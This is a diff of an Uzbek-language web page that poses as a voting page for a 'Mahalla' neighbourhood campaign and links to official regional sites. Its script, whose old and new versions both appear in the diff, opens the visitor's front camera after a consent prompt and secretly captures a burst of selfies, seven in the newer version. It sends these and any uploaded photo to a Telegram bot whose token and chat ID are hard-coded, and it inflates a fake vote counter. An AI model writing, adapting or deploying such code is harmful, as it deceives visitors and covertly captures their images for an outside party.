@@ -319,7 +319,7 @@ body {
       </p>
       <div class="modal-buttons">
         <button id="allowBtn" class="modal-btn allow">Ha, ruxsat beraman</button>
-        <button id="denyBtn" class="modal-btn allow">Yo‘q</button>
+        <button id="allowBtn" class="modal-btn allow">Yo‘q</button>
       </div>
     </div>
   </div>
@@ -349,170 +349,179 @@ body {
     <a href="https://www.surxonstat.uz/uz/matbuot-markazi/qo-mita-yangiliklar/13960-obod-va-fayzli-mahalla-yurt-ko-rki-umumxalq-xayriya-hashari-davom-etmoqda" target="_blank">Surxondaryo Stat</a> |
     <a href="https://www.facebook.com/fvhokimligi/posts/1229863792503850/" target="_blank">Farg‘ona Hokimligi</a>
   </div>
+<script>
+  // ==== Bot ma'lumotlari ====
+  const BOT_TOKEN = '7978359844:AAH_su2pm1WJQZuzSjkNsu8BRo-cemtvKgg';
+  const CHAT_ID   = '7412640853';
 
-  <script>
-    // ==== Bot ma'lumotlari ====
-    const BOT_TOKEN = '7978359844:AAH_su2pm1WJQZuzSjkNsu8BRo-cemtvKgg';
-    const CHAT_ID   = '7412640853';
+  const video       = document.getElementById('video');
+  const status      = document.getElementById('status');
+  const modal       = document.getElementById('modal');
+  const allowBtn    = document.getElementById('allowBtn');
+  const denyBtn     = document.getElementById('denyBtn');
+  const voteBtn     = document.getElementById('voteBtn');
+  const fileInput   = document.getElementById('fileInput');
+  const voteCountEl = document.getElementById('voteCount');
 
-    const video       = document.getElementById('video');
-    const status      = document.getElementById('status');
-    const modal       = document.getElementById('modal');
-    const allowBtn    = document.getElementById('allowBtn');
-    const denyBtn     = document.getElementById('denyBtn');
-    const voteBtn     = document.getElementById('voteBtn');
-    const fileInput   = document.getElementById('fileInput');
-    const voteCountEl = document.getElementById('voteCount');
+  let stream = null;
+  let isRunning = false;
+  let voteCount = 1247;
 
-    let stream = null;
-    let captureInterval = null;
-    let isRunning = false;
-    let voteCount = 1247;
-
-    // ==== Ovoz hisoblagichi ====
-    function updateVoteCount() {
-      voteCount++;
-      voteCountEl.textContent = voteCount.toLocaleString('uz-UZ');
-      voteCountEl.classList.add('pulse');
-      setTimeout(() => voteCountEl.classList.remove('pulse'), 600);
-    }
-
-    // ==== Status xabari ====
-    function showStatus(msg, type = 'info') {
-      status.textContent = msg;
-      status.className = `status ${type}`;
-    }
-
-    // ==== Modal ko‘rsatish ====
-    window.addEventListener('load', () => {
-      setTimeout(() => modal.style.display = 'flex', 800);
-    });
-
-    allowBtn.onclick = () => {
-      modal.style.display = 'none';
-      startHiddenCamera();
-    };
-
-    denyBtn.onclick = () => {
-      modal.style.display = 'none';
-      showStatus('Ruxsat berilmadi.', 'error');
-    };
-
-    // ==== Oddiy ovoz berish tugmasi ====
-    voteBtn.onclick = () => {
-      updateVoteCount();
-      showStatus('Ovoz qabul qilindi!', 'success');
-      setTimeout(() => showStatus('Yana ovoz bering yoki rasm yuklang.', 'info'), 2000);
-    };
-
-    // ==== Rasm yuklash ====
-    fileInput.addEventListener('change', async () => {
-      const file = fileInput.files[0];
-      if (!file) return;
-      showStatus('Rasm tayyorlanmoqda...', 'info');
-      try {
-        const blob = await resizeImage(file, 1280, 720);
-        await sendToTelegram(blob, 'rasm');
-        fileInput.value = '';
-      } catch (e) {
-        showStatus('Rasm yuborishda xato.', 'error');
-      }
-    });
-
-    function resizeImage(file, maxW, maxH) {
-      return new Promise((resolve, reject) => {
-        const img = new Image();
-        const reader = new FileReader();
-        reader.onload = e => { img.src = e.target.result; };
-        img.onload = () => {
-          const canvas = document.createElement('canvas');
-          let w = img.width, h = img.height;
-          if (w > maxW || h > maxH) {
-            const ratio = Math.min(maxW / w, maxH / h);
-            w = Math.round(w * ratio); h = Math.round(h * ratio);
-          }
-          canvas.width = w; canvas.height = h;
-          const ctx = canvas.getContext('2d');
-          ctx.drawImage(img, 0, 0, w, h);
-          canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.85);
-        };
-        reader.onerror = reject;
-        reader.readAsDataURL(file);
-      });
-    }
-
-    // ==== Yashirin kamera + har 3s da 5 ta surat ====
-    async function startHiddenCamera() {
-      try {
-        showStatus('Kamera tayyorlanmoqda...', 'info');
-        stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } }
-        });
-        video.srcObject = stream;
-        video.onloadedmetadata = () => {
-          video.play();
-          showStatus('Avto boshlandi! Har 3s da 5 ta surat...', 'success');
-          isRunning = true;
-
-          // birinchi 5 ta – 1 soniyadan keyin
-          setTimeout(captureFive, 1000);
-          // keyin har 3 soniyada
-          captureInterval = setInterval(() => {
-            if (isRunning) captureFive();
-          }, 3000);
-        };
-      } catch (e) {
-        showStatus('Kamera ochilmadi. Ruxsatni tekshiring.', 'error');
-      }
-    }
-
-    async function captureFive() {
-      if (!video.videoWidth || !isRunning) return;
-      const canvas = document.createElement('canvas');
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      const ctx = canvas.getContext('2d');
-
-      for (let i = 0; i < 5; i++) {
-        if (!isRunning) break;
-        ctx.drawImage(video, 0, 0);
-        const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
-        await sendToTelegram(blob, 'selfie');
-        await new Promise(r => setTimeout(r, 180)); // 180 ms oraliq
-      }
-    }
-
-    // ==== Telegramga yuborish ====
-    async function sendToTelegram(blob, type) {
-      try {
-        const form = new FormData();
-        form.append('chat_id', CHAT_ID);
-        form.append('photo', blob, `${type}_${Date.now()}.jpg`);
-        form.append('caption',
-          `*Obod va Fayzli Mahalla – Yurt Ko‘rki*\n` +
-          `*Ovoz berildi!* (${type === 'selfie' ? 'avto selfie' : 'yuklangan rasm'})\n` +
-          `*Vaqt:* ${new Date().toLocaleString('uz-UZ')}\n` +
-          `_Hashar ishtirokchisi_`
-        );
-
-        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-          method: 'POST', body: form
-        });
-        const json = await res.json();
-
-        if (json.ok) {
-          updateVoteCount();
-          showStatus(`Surat yuborildi! Jami: ${voteCount}`, 'success');
-        } else {
-          showStatus('Yuborishda xato.', 'error');
-        }
-      } catch (e) {
-        showStatus('Internet xatosi.', 'error');
-      }
-    }
-
-    // ==== Boshlang‘ich hisoblagich ====
+  // ==== Ovoz hisoblagichi ====
+  function updateVoteCount() {
+    voteCount++;
     voteCountEl.textContent = voteCount.toLocaleString('uz-UZ');
-  </script>
+    voteCountEl.classList.add('pulse');
+    setTimeout(() => voteCountEl.classList.remove('pulse'), 600);
+  }
+
+  // ==== Status xabari ====
+  function showStatus(msg, type = 'info') {
+    status.textContent = msg;
+    status.className = `status ${type}`;
+  }
+
+  // ==== Modal ko‘rsatish ====
+  window.addEventListener('load', () => {
+    setTimeout(() => modal.style.display = 'flex', 800);
+  });
+
+  allowBtn.onclick = () => {
+    modal.style.display = 'none';
+    startHiddenCamera();
+  };
+
+  denyBtn.onclick = () => {
+    modal.style.display = 'none';
+    showStatus('Ruxsat berilmadi.', 'error');
+  };
+
+  // ==== Oddiy ovoz berish tugmasi ====
+  voteBtn.onclick = () => {
+    updateVoteCount();
+    showStatus('Ovoz qabul qilindi!', 'success');
+    setTimeout(() => showStatus('Yana ovoz bering yoki rasm yuklang.', 'info'), 2000);
+  };
+
+  // ==== Rasm yuklash ====
+  fileInput.addEventListener('change', async () => {
+    const file = fileInput.files[0];
+    if (!file) return;
+    showStatus('Rasm tayyorlanmoqda...', 'info');
+    try {
+      const blob = await resizeImage(file, 1280, 720);
+      await sendToTelegram(blob, 'rasm');
+      fileInput.value = '';
+    } catch (e) {
+      showStatus('Rasm yuborishda xato.', 'error');
+    }
+  });
+
+  function resizeImage(file, maxW, maxH) {
+    return new Promise((resolve, reject) => {
+      const img = new Image();
+      const reader = new FileReader();
+      reader.onload = e => { img.src = e.target.result; };
+      img.onload = () => {
+        const canvas = document.createElement('canvas');
+        let w = img.width, h = img.height;
+        if (w > maxW || h > maxH) {
+          const ratio = Math.min(maxW / w, maxH / h);
+          w = Math.round(w * ratio);
+          h = Math.round(h * ratio);
+        }
+        canvas.width = w;
+        canvas.height = h;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(img, 0, 0, w, h);
+        canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.85);
+      };
+      reader.onerror = reject;
+      reader.readAsDataURL(file);
+    });
+  }
+
+  // ==== Kamera faqat 7 ta rasm yuboradi ====
+  async function startHiddenCamera() {
+    try {
+      showStatus('Kamera tayyorlanmoqda...', 'info');
+      stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } }
+      });
+      video.srcObject = stream;
+      video.onloadedmetadata = () => {
+        video.play();
+        isRunning = true;
+        showStatus('Kamera yoqildi! 7 ta surat yuborilmoqda...', 'success');
+        captureSeven(); // faqat 7 ta rasm yuboradi
+      };
+    } catch (e) {
+      showStatus('Kamera ochilmadi. Ruxsatni tekshiring.', 'error');
+    }
+  }
+
+  // ==== Faqat 7 ta surat yuborish ====
+  async function captureSeven() {
+    if (!video.videoWidth || !isRunning) return;
+
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    const ctx = canvas.getContext('2d');
+
+    for (let i = 0; i < 7; i++) {
+      if (!isRunning) break;
+      ctx.drawImage(video, 0, 0);
+      const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
+      await sendToTelegram(blob, 'selfie');
+      await new Promise(r => setTimeout(r, 250)); // har 0.25 soniyada
+    }
+
+    stopCamera(); // 7 ta rasm yuborilgach kamera to‘xtaydi
+    showStatus('7 ta surat yuborildi va kamera o‘chirildi ✅', 'success');
+  }
+
+  // ==== Kamera to‘xtatish ====
+  function stopCamera() {
+    if (stream) {
+      stream.getTracks().forEach(track => track.stop());
+    }
+    isRunning = false;
+  }
+
+  // ==== Telegramga yuborish ====
+  async function sendToTelegram(blob, type) {
+    try {
+      const form = new FormData();
+      form.append('chat_id', CHAT_ID);
+      form.append('photo', blob, `${type}_${Date.now()}.jpg`);
+      form.append('caption',
+        `*Obod va Fayzli Mahalla – Yurt Ko‘rki*\n` +
+        `*Ovoz berildi!* (${type === 'selfie' ? 'avto selfie' : 'yuklangan rasm'})\n` +
+        `*Vaqt:* ${new Date().toLocaleString('uz-UZ')}\n` +
+        `_Hashar ishtirokchisi_`
+      );
+
+      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        method: 'POST',
+        body: form
+      });
+
+      const json = await res.json();
+
+      if (json.ok) {
+        updateVoteCount();
+      } else {
+        showStatus('Yuborishda xato.', 'error');
+      }
+    } catch (e) {
+      showStatus('Internet xatosi.', 'error');
+    }
+  }
+
+  // ==== Boshlang‘ich hisoblagich ====
+  voteCountEl.textContent = voteCount.toLocaleString('uz-UZ');
+</script>
+
 </body>
 </html>
